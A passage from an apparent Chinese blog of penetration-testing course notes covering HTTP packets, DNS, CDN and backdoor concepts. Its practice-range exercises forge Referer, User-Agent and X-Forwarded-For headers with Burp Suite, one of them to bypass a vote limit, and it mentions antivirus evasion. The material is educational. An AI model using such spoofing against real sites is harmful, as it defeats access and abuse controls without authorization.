href="#涉及资源：" class="headerlink" title="涉及资源："></a>涉及资源：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/ermei/p/6689005.html</span><br><span class="line"></span><br><span class="line">http://blog.leanote.com/post/snowming/9da184ef24bd</span><br><span class="line"></span><br><span class="line">https://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3</span><br><span class="line">Sm13dz09bW96aGUmozhe</span><br><span class="line"></span><br><span class="line">https://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGx</span><br><span class="line">aL0JjUT09bW96aGUmozhe</span><br><span class="line"></span><br><span class="line">https://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDd</span><br><span class="line">Xl0Zz09bW96aGUmozhe</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 代码执行 </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>02基础入门--数据包拓展</title>
      <link href="/2021/09/12/02%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/"/>
      <url>/2021/09/12/02%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<p>小迪学习第二天</p><span id="more"></span><h3 id="网站解析对应"><a href="#网站解析对应" class="headerlink" title="网站解析对应"></a>网站解析对应</h3><h4 id="简要网站搭建过程"><a href="#简要网站搭建过程" class="headerlink" title="简要网站搭建过程"></a>简要网站搭建过程</h4><p><a href="https://www.cnblogs.com/GodSince/p/12010184.html">https://www.cnblogs.com/GodSince/p/12010184.html</a></p><h4 id="涉及到的攻击层面？"><a href="#涉及到的攻击层面？" class="headerlink" title="涉及到的攻击层面？"></a>涉及到的攻击层面？</h4><p>源码，搭建平台，系统，网络层等</p><h4 id="涉及到的安全问题？"><a href="#涉及到的安全问题？" class="headerlink" title="涉及到的安全问题？"></a>涉及到的安全问题？</h4><p>目录，敏感文件，弱口令，IP 及域名等</p><h3 id="HTTP-S数据包"><a href="#HTTP-S数据包" class="headerlink" title="HTTP/S数据包"></a>HTTP/S数据包</h3><p>Request请求数据包</p><p>Response返回数据包</p><p><img src="https://p.pstatp.com/origin/pgc-image/6531c95e858442ef8b03c11046995819"></p><p>Request请求数据包</p><p>Proxy代理服务器 </p><p>Response返回数据包</p><p><img src="https://p.pstatp.com/origin/pgc-image/99fae3708d554786a1045757054e7c35"></p><h3 id="关于HTTP和HTTPS"><a href="#关于HTTP和HTTPS" class="headerlink" title="关于HTTP和HTTPS"></a>关于HTTP和HTTPS</h3><p>HTTP（HyperText Transfer Protocol：超文本传输协议）是一种用于分布式、协作式和超媒体信息系统的应用层协议。 简单来说就是一种发布和接收 HTML 页面的方法，被用于在 Web 浏览器和网站服务器之间传递信息。</p><p>HTTP 默认工作在 TCP 协议 80 端口，用户访问网站 http:// 打头的都是标准 HTTP 服务。</p><p>HTTP 协议以明文方式发送内容，不提供任何方式的数据加密，如果攻击者截取了Web浏览器和网站服务器之间的传输报文，就可以直接读懂其中的信息，因此，HTTP协议不适合传输一些敏感信息，比如：信用卡号、密码等支付信息。</p><p>HTTPS（Hypertext Transfer Protocol Secure：超文本传输安全协议）是一种透过计算机网络进行安全通信的传输协议。HTTPS 经由 HTTP 进行通信，但利用 SSL/TLS 来加密数据包。HTTPS 开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。</p><p>HTTPS 默认工作在 TCP 协议443端口，它的工作流程一般如以下方式：</p><ul><li>1、TCP 三次同步握手</li><li>2、客户端验证服务器数字证书</li><li>3、DH 算法协商对称加密算法的密钥、hash 算法的密钥</li><li>4、SSL 安全加密隧道协商完成</li><li>5、网页以加密的方式传输，用协商的对称加密算法和密钥加密，保证数据机密性；用协商的hash算法进行数据完整性保护，保证数据不被篡改。</li></ul><p>HTTP和HTTPS的简要通信过程</p><p>HTTP：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">建立连接——&gt;发送请求数据包——&gt;返回响应数据包——&gt;关闭连接</span><br><span class="line">1.浏览器建立与 web 服务器之间的连接</span><br><span class="line">2.浏览器将请求数据打包（生成请求数据包）并发送到 web 服务器</span><br><span class="line">3.web 服务器将处理结果打包（生成响应数据包）并发送给浏览器</span><br><span class="line">4.web 服务器关闭连接</span><br></pre></td></tr></table></figure><p>HTTPS：</p><img src="https://p.pstatp.com/origin/pgc-image/3a7a4f0e9fc94b1aae716f713fbe8184" style="zoom:67%;" /><h3 id="HTTP-HTTPS-具体区别？"><a href="#HTTP-HTTPS-具体区别？" class="headerlink" title="HTTP/HTTPS 具体区别？"></a>HTTP/HTTPS 具体区别？</h3><ul><li>HTTP 明文传输，数据都是未加密的，安全性较差，HTTPS（SSL+HTTP） 数据传输过程是加密的，安全性较好。</li><li>使用 HTTPS 协议需要到 CA（Certificate Authority，数字证书认证机构） 申请证书，一般免费证书较少，因而需要一定费用。证书颁发机构如：Symantec、Comodo、GoDaddy 和 GlobalSign 等。</li><li>HTTP 页面响应速度比 HTTPS 快，主要是因为 HTTP 使用 TCP 三次握手建立连接，客户端和服务器需要交换 3 个包，而 HTTPS除了 TCP 的三个包，还要加上 ssl 握手需要的 9 个包，所以一共是 12 个包。</li><li>http 和 https 使用的是完全不同的连接方式，用的端口也不一样，前者是 80，后者是 443。</li><li>HTTPS 其实就是建构在 SSL/TLS 之上的 HTTP 协议，所以，要比较 HTTPS 比 HTTP 要更耗费服务器资源。</li></ul><h3 id="Request-请求数据包数据格式"><a href="#Request-请求数据包数据格式" class="headerlink" title="Request 请求数据包数据格式"></a>Request 请求数据包数据格式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请求行：请求类型/请求资源路径、协议的版本和类型</span><br><span class="line">请求头：一些键值对，浏览器与 web 服务器之间都可以发送，特定的某种含义</span><br><span class="line">空行：请求头与请求体之间用一个空行隔开；</span><br><span class="line">请求体：要发送的数据(一般 post 提交会使用)；例：user=123&amp;pass=123</span><br></pre></td></tr></table></figure><p>例如：Request Headers</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /adduser HTTP/1.1</span><br><span class="line">Host: localhost:8030</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 16</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Origin: chrome-extension://fdmmgilgnpjigdojojpjoooidkmcomcm</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)</span><br><span class="line">Chrome/66.0.3359.181 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure><h4 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h4><p>请求行由三个标记组成：请求方法、请求 URL 和 HTTP 版本，它们用空格分享。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br></pre></td></tr></table></figure><p>HTTP 规划定义了 8 种可能的请求方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET：检索 URL 中标识资源的一个简单请求</span><br><span class="line">HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档</span><br><span class="line">POST：服务器接受被写入客户端输出流中的数据的请求</span><br><span class="line">PUT：服务器保存请求数据作为指定 URL 新内容的请求</span><br><span class="line">DELETE：服务器删除 URL 中命令的资源的请求</span><br><span class="line">OPTIONS：关于服务器支持的请求方法信息的请求</span><br><span class="line">TRACE：web 服务器反馈 Http 请求和其头标的请求</span><br><span class="line">CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理</span><br></pre></td></tr></table></figure><h4 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h4><p>由关键字/值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HOST: 主机或域名地址</span><br><span class="line">Accept：指浏览器或其他客户可以接爱的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格式。</span><br><span class="line">User-Agent：是客户浏览器名称</span><br><span class="line">Host：对应网址 URL 中的 Web 名称和端口号。</span><br><span class="line">Accept-Langeuage：指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。</span><br><span class="line">connection：用来告诉服务器是否可以维持固定的 HTTP 连接。http 是无连接的，HTTP/1.1 使用 Keep-Alive</span><br><span class="line">为默认值，这样，当浏览器需要多个文件时(比如一个 HTML 文件和相关的图形文件)，不需要每次都建立连接</span><br><span class="line">Cookie：浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。</span><br><span class="line">Referer：表明产生请求的网页URL。如比从网页/icconcept/index.jsp中点击一个链接到网页</span><br><span class="line">/icwork/search ， 在 向 服 务 器 发 送 的 GET/icwork/search 中 的 请 求 中 ， Referer 是</span><br><span class="line">http://hostname:8080/icconcept/index.jsp。这个属性可以用来跟踪 Web 请求是从什么网站来的。</span><br><span class="line">Content-Type：用来表名 request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。</span><br><span class="line">Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1.</span><br><span class="line">Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。</span><br></pre></td></tr></table></figure><h4 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h4><p>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</p><h4 id="请求数据"><a href="#请求数据" class="headerlink" title="请求数据"></a>请求数据</h4><p>使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。</p><h3 id="Response-返回数据包数据格式"><a href="#Response-返回数据包数据格式" class="headerlink" title="Response 返回数据包数据格式"></a>Response 返回数据包数据格式</h3><p>一个响应由四个部分组成；状态行、响应头标、空行、响应数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔</span><br><span class="line">响应头标：包含服务器类型、日期、长度、内容类型等</span><br><span class="line">空行：响应头与响应体之间用空行隔开</span><br><span class="line">响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面</span><br></pre></td></tr></table></figure><h4 id="HTTP-响应码："><a href="#HTTP-响应码：" class="headerlink" title="HTTP 响应码："></a>HTTP 响应码：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1xx：信息，请求收到，继续处理</span><br><span class="line">2xx：成功，行为被成功地接受、理解和采纳</span><br><span class="line">3xx：重定向，为了完成请求，必须进一步执行的动作</span><br><span class="line">4xx：客户端错误</span><br><span class="line">5xx：服务器错误</span><br></pre></td></tr></table></figure><h4 id="响应头标"><a href="#响应头标" class="headerlink" title="响应头标"></a>响应头标</h4><p>想请求头标一样，他们指出服务器的功能，标识出响应数据的细节</p><h4 id="空行-1"><a href="#空行-1" class="headerlink" title="空行"></a>空行</h4><p>最后一个响应头标之后是一个空行，发送回车间和退行，表明服务器以下不再有头标</p><h4 id="响应数据"><a href="#响应数据" class="headerlink" title="响应数据"></a>响应数据</h4><p>HTML文档和图像等，也是HTML本身</p><h3 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h3><h4 id="Burp-Suite-抓包"><a href="#Burp-Suite-抓包" class="headerlink" title="Burp Suite 抓包"></a>Burp Suite 抓包</h4><p><img src="https://p.pstatp.com/origin/pgc-image/8642e53d083142d1bcaec7ef42f13b84" style="zoom:67%;" /><img src="https://p.pstatp.com/origin/pgc-image/e4d8a13f5b5748529bf9a24e35525e10"></p><p><img src="https://p.pstatp.com/origin/pgc-image/e4d8a13f5b5748529bf9a24e35525e10"></p><img src="https://p.pstatp.com/origin/pgc-image/ea4d2e62b483443d9167a38473bd1189" style="zoom:67%;" /><h4 id="第三方检测修改实现XSS攻击"><a href="#第三方检测修改实现XSS攻击" class="headerlink" title="第三方检测修改实现XSS攻击"></a>第三方检测修改实现XSS攻击</h4><p>已经被修复了。</p><p><img src="https://p.pstatp.com/origin/pgc-image/f65d99f08f774578a0330c88d1e8ce67"></p><h4 id="来源页伪造"><a href="#来源页伪造" class="headerlink" title="来源页伪造"></a>来源页伪造</h4><p><a href="https://www.mozhe.cn/bug/detail/56">https://www.mozhe.cn/bug/detail/56</a></p><p><img src="https://p.pstatp.com/origin/pgc-image/a6670122175c49cd93232959fe31949b"></p><p>在burp上进行抓包进行来源页吗修改</p><p>修改Referer参数，地址来源</p><p><img src="https://p.pstatp.com/origin/pgc-image/0922534728924315a0a3fa06f7095bfb"></p><p><img src="https://p.pstatp.com/origin/pgc-image/9d21d2f9d38e465295a83947c4488e39"></p><h4 id="浏览器信息伪造"><a href="#浏览器信息伪造" class="headerlink" title="浏览器信息伪造"></a>浏览器信息伪造</h4><img src="https://p.pstatp.com/origin/pgc-image/81e5d54050674e2fbc50609c13bce880" style="zoom:80%;" /><p>需要伪造IPhone手机和2G信号</p><p>通过伪造User-Agent来实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X)AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/6.0NetType/2G</span><br></pre></td></tr></table></figure><p><img src="https://p.pstatp.com/origin/pgc-image/a7764c582fd24bf7a4e1269ffbe7ae2d"></p><p>成功伪造</p><p><img src="https://p.pstatp.com/origin/pgc-image/6c5e25852b7c4cad98645f7f2b7b060a"></p><h4 id="HTTP动作练习"><a href="#HTTP动作练习" class="headerlink" title="HTTP动作练习"></a>HTTP动作练习</h4><p>这里应该是需要将GET方式改为POST方式，bp抓包然后选择变更请求方式，然后发包。</p><img src="https://p.pstatp.com/origin/pgc-image/0097ec344087463db15a174962ea1e8c" style="zoom:67%;" /><h4 id="投票系统缺陷"><a href="#投票系统缺陷" class="headerlink" title="投票系统缺陷"></a>投票系统缺陷</h4><p>要求让ggg获得第一。</p><p>抓一下包看一下。应该是通过ip去限制投票次数，这里使用<code>X-Forwarded-For</code>来伪造ip，然后就可以无限投票了。</p><img src="https://p.pstatp.com/origin/pgc-image/adb3167cc5cc481581441f254a9aec78" style="zoom:67%;" /><p>成功得到第一</p><p><img src="https://p.pstatp.com/origin/pgc-image/6f1fe0e72a6a47a0a06fad49b3e9e485"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 基础入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>01基础入门--概念名词</title>
      <link href="/2021/09/10/01%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/"/>
      <url>/2021/09/10/01%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/</url>
      
        <content type="html"><![CDATA[<h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><h4 id="什么是域名"><a href="#什么是域名" class="headerlink" title="什么是域名"></a>什么是域名</h4><p>域名（Domain names）是互联网基础架构的关键部分。它们为互联网上任何可用的网页服务器提供了方便人类理解的地址。</p><span id="more"></span><p>任何连上互联网的电脑都可以通过一个公共IP地址访问到，对于IPv4地址来说，这个地址有32位（它们通常写成四个范围在0~255以内，由点分隔的数字组成，比如173.194.121.32），而对于IPv6来说，这个地址有128位，通常写成八组由冒号分隔的四个十六进制数(e.g., <code>2027:0da8:8b73:0000:0000:8a2e:0370:1337</code>). 计算机可以很容易地处理这些IP地址, 但是对一个人来说很难找出谁在操控这些服务器以及这些网站提供什么服务。IP 地址很难记忆而且可能会随着时间的推移发生改变 。为了解决这些问题，我们使用方便记忆的地址，称作域名。</p><h4 id="域名在哪里注册"><a href="#域名在哪里注册" class="headerlink" title="域名在哪里注册"></a>域名在哪里注册</h4><p>域名注册是Internet中用于解决地址对应问题的一种方法。根据中国互联网络域名管理办法，域名注册服务机构及域名注册管理机构需对申请人提出的域名是否违反了第三方的权利和申请人的真实身份进行核验。每一个相同顶级域名中的二级域名注册都是独一无二的，不可重复的，但不同顶级域名中的二级域名可以是相同的，例如baidu这个二级域名曾可以在.com中注册，也可以在.cn中注册，也可以在.xyz中及其他多种顶级域名中注册，且每个域名都起到同样的作用。因此，在网络上域名是一种相对有限的资源，它的价值随着注册企业和个人用户的增多而逐步为人们所重视。一般域名需要通过域名注册商去注册。</p><h4 id="顶级域名、一级域名"><a href="#顶级域名、一级域名" class="headerlink" title="顶级域名、一级域名"></a>顶级域名、一级域名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Top-level domains，first-level domains（TLDs），也翻译为国际顶级域名，也成一级域名。</span><br><span class="line">　　.com 供商业机构使用，但无限制最常用</span><br><span class="line">　　.net 原供网络服务供应商使用，现无限制</span><br><span class="line">　　.org 原供不属于其他通用顶级域类别的组织使用，现无限制</span><br><span class="line">　　.edu / .gov / .mil 供美国教育机构/美国政府机关/美国军事机构。因历史遗留问题一般只在美国专用</span><br><span class="line">　　.aero 供航空运输业使用</span><br><span class="line">　　.biz 供商业使用</span><br><span class="line">　　.coop 供联合会（cooperatives）使用</span><br><span class="line">　　.info 供信息性网站使用，但无限制</span><br><span class="line">　　.museum 供博物馆使用</span><br><span class="line">　　.name 供家庭及个人使用</span><br><span class="line">　　.pro 供部分专业使用</span><br><span class="line">　　.asia 供亚洲社区使用</span><br><span class="line">　　.tel 供连接电话网络与因特网的服务使用</span><br><span class="line">　　.post 供邮政服务使用</span><br><span class="line">　　.mail 供邮件网站使用</span><br><span class="line">　　国家顶级域名：cn（中国大陆）、de（德国）、eu（欧盟）、jp（日本）、hk（中国香港）、tw（中国台湾）、uk（英国）、us（美国）</span><br></pre></td></tr></table></figure><h4 id="什么是二级域名多级域名？"><a href="#什么是二级域名多级域名？" class="headerlink" title="什么是二级域名多级域名？"></a>什么是二级域名多级域名？</h4><p>二级域（或称二级域名；英语：Second-level domain；英文缩写：SLD）是互联网DNS等级之中，处于顶级域名之下的域。二级域名是域名的倒数第二个部分，例如在域名example.baidu.com中，二级域名是Baidu。</p><p>　　.com 顶级域名/一级域名，更准确的说叫顶级域</p><p>　　baidu.com 二级域名，更准确的说叫二级域</p><p>　　tieba.baidu.com 三级域名，更准确的说叫三级域</p><p>　　detail.tieba.baidu.com 四级域名，更准确的说叫四级域</p><p>…….</p><h4 id="域名发现对于安全测试意义？"><a href="#域名发现对于安全测试意义？" class="headerlink" title="域名发现对于安全测试意义？"></a>域名发现对于安全测试意义？</h4><p>    进行渗透测试时，其主域名找不到漏洞时，就可以尝试去测试收集到的子域名，有可能测试子域名网站时会有意向不到的效果，然后可以由此横向到主网站。</p><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><h4 id="什么是DNS？"><a href="#什么是DNS？" class="headerlink" title="什么是DNS？"></a>什么是DNS？</h4><p>DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名(domain name)和与之相对应的IP地址 (IP address)的表，以解析消息的域名。 例如百度的域名是<a href="http://www.baidu.com,在dns中对应的ip是1.2.3.4(假设),那么我们在浏览器中输入百度的域名,dns就会解析为1.2.3.4./">www.baidu.com,在DNS中对应的IP是1.2.3.4(假设),那么我们在浏览器中输入百度的域名，DNS就会解析为1.2.3.4。</a></p><h4 id="本地HOSTS与DNS的关系？"><a href="#本地HOSTS与DNS的关系？" class="headerlink" title="本地HOSTS与DNS的关系？"></a>本地HOSTS与DNS的关系？</h4><p>客户端查询DNS的过程是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本地host文件—本地缓存—-DNS服务器</span><br></pre></td></tr></table></figure><p>Hosts文件目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在Windows中，它的目录通常在C盘的Windows\system32\drivers\etc\下。</span><br></pre></td></tr></table></figure><p>Hosts文件是一个纯文本文件，用记事本就可以将其打开。这个文件是根据TCP/IP for Windows 的标准来工作的，它的作用是包含IP地址和Host name(主机名)的映射关系，每段只能包括一个映射关系，IP地址要放在每段的最前面，后面写Host name(主机名)，中间加个空格。如：<code>127.0.0.1 localhost</code>.</p><p>我们知道，当电脑访问网站时，首先通过DNS服务器把网络 <a href="https://cloud.tencent.com/product/cns?from=10680">域名解析</a>成IP地址后，我们的计算机才能访问。如果每个域名请求都要等待域名服务器解析后返回IP，访问速度就会比较慢，而Hosts文件正可以解决这个问题。在进行DNS请求以前，Windows系统会先检查Hosts文件中是否有这个地址映射关系，如果有则调用这个IP地址映射，如果没有再向DNS服务器提出域名解析。</p><p>eg：这里用我自己的博客地址作为演示，当我们ping l0ne1y.github.io的时候可以看到他的ip地址是185.199.110.153。</p><p><img src="https://p.pstatp.com/origin/pgc-image/dbba0580625e4cf8956b037c5e6c36c2"></p><p>当我们修改了本地hosts文件后，再次ping l0ne1y.github.io地址，发现ip地址变成了1.2.3.4。</p><p><img src="https://p.pstatp.com/origin/pgc-image/311b8910aa7a4db69ebdfcb9a119b136"></p><p><img src="https://p.pstatp.com/origin/pgc-image/80083fe044f84de5a6f6f0b6c3bc5f27"></p><h4 id="CDN是什么？与DNS的关系？"><a href="#CDN是什么？与DNS的关系？" class="headerlink" title="CDN是什么？与DNS的关系？"></a>CDN是什么？与DNS的关系？</h4><p>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。举个例子，现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个CDN服务器，上面缓存住一些数据，深圳用户访问时先访问这个CDN服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了。</p><p>CDN实际上是一个就近访问，那么现在有一个问题是，我们怎么知道用户的所在位置从而给他分配最佳的CDN节点呢。这就需要DNS服务来进行定位了。当我们通过使用DNS服务的时候，可以根据他使用的LDNS服务器来进行一个定位，例如我们的调度服务器看到他是来自深圳电信的LDNS服务器，那么我们就认为该用户来自深圳电信，然后调度服务器可以让该用户去访问深圳电信的CDN服务器，这样就让用户访问到了最优的CDN节点。通过DNS服务我们可以很快的定位到用户的位置，然后给用户分配最佳CDN节点.</p><h4 id="常见的DNS安全攻击有哪些"><a href="#常见的DNS安全攻击有哪些" class="headerlink" title="常见的DNS安全攻击有哪些?"></a>常见的DNS安全攻击有哪些?</h4><ol><li>域名劫持</li></ol><p>通过采用黑客手段控制了域名管理密码和域名管理邮箱，然后将该域名的NS纪录指向到黑客可以控制的DNS服务器，然后通过在该DNS服务器上添加相应域名纪录，从而使网民访问该域名时，进入了黑客所指向的内容。这显然是DNS服务提供商的责任，用户束手无策。</p><ol start="2"><li>缓存投毒</li></ol><p>利用控制DNS缓存服务器，把原本准备访问某网站的用户在不知不觉中带到黑客指向的其他网站上。其实现方式有多种，比如可以通过利用网民ISP端的DNS缓存服务器的漏洞进行攻击或控制，从而改变该ISP内的用户访问域名的响应结果;或者，黑客通过利用用户权威域名服务器上的漏洞，如当用户权威域名服务器同时可以被当作缓存服务器使用，黑客可以实现缓存投毒，将错误的域名纪录存入缓存中，从而使所有使用该缓存服务器的用户得到错误的DNS解析结果。</p><p>3)DDOS攻击</p><p>一种攻击针对DNS服务器软件本身，通常利用BIND软件程序中的漏洞，导致DNS服务器崩溃或拒绝服务;另一种攻击的目标不是DNS服务器，而是利用DNS服务器作为中间的“攻击放大器”，去攻击其它互联网上的主机，导致被攻击主机拒绝服务。</p><ol start="4"><li>DNS欺骗</li></ol><p>DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。</p><p>原理：如果可以冒充域名服务器，然后把查询的IP地址设为攻击者的IP地址，这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站的主页了，这就是DNS欺骗的基本原理。DNS欺骗其实并不是真的“黑掉”了对方的网站，而是冒名顶替、招摇撞骗罢了。</p><h3 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h3><h4 id="常见的脚本语言类型有哪些？"><a href="#常见的脚本语言类型有哪些？" class="headerlink" title="常见的脚本语言类型有哪些？"></a>常见的脚本语言类型有哪些？</h4><p>脚本语言又被称为扩建的语言，或者动态语言，是一种编程语言，用来控制软件应用程序，脚本通常以文本（如ASCII)保存，只在被调用时进行解释或编译。<br>Scala、JavaScript，VBScript，ActionScript，MAXScript，ASP，JSP，PHP，SQL，Perl，Shell，python，Ruby，JavaFX，Lua，AutoIt等</p><h4 id="不同脚本类型与安全漏洞的关系？"><a href="#不同脚本类型与安全漏洞的关系？" class="headerlink" title="不同脚本类型与安全漏洞的关系？"></a>不同脚本类型与安全漏洞的关系？</h4><p>不同的脚本语言决定了安全漏洞的多少。</p><h4 id="漏洞挖掘代码审计与脚本类型的关系？"><a href="#漏洞挖掘代码审计与脚本类型的关系？" class="headerlink" title="漏洞挖掘代码审计与脚本类型的关系？"></a>漏洞挖掘代码审计与脚本类型的关系？</h4><p>同上</p><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><h4 id="什么是后门？有那些后门？"><a href="#什么是后门？有那些后门？" class="headerlink" title="什么是后门？有那些后门？"></a>什么是后门？有那些后门？</h4><p>后门是指绕过安全控制而获取对程序或系统访问权的方法。后门的最主要目的就是方便以后再次秘密进入或者控制系统。根据实现方式的不同，可以将后门分为网页后门、线程插入后门、扩展后门、C/S 后门和账户后门等类型。</p><h4 id="后门在安全测试中的实际意义？"><a href="#后门在安全测试中的实际意义？" class="headerlink" title="后门在安全测试中的实际意义？"></a>后门在安全测试中的实际意义？</h4><p>(1)方便下次更方便的进来。 </p><p>(2)获取到相关权限之后，后门相当于一个管道，便于操作。</p><h3 id="关于后门需要了解那些？（玩法，免杀）"><a href="#关于后门需要了解那些？（玩法，免杀）" class="headerlink" title="关于后门需要了解那些？（玩法，免杀）"></a>关于后门需要了解那些？（玩法，免杀）</h3><p>免杀，就是绕过杀毒软件的防护，避免被检测到。</p><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="WEB-的组成架构模型？"><a href="#WEB-的组成架构模型？" class="headerlink" title="WEB 的组成架构模型？"></a>WEB 的组成架构模型？</h4><p>网站源码：分脚本类型，分应用方向<br>操作系统：windows linux<br>中间件（搭建平台）：apache iis tomcat nginx 等<br>数据库：access mysql mssql oracle sybase db2 postsql 等</p><h4 id="架构漏洞安全测试简要介绍？"><a href="#架构漏洞安全测试简要介绍？" 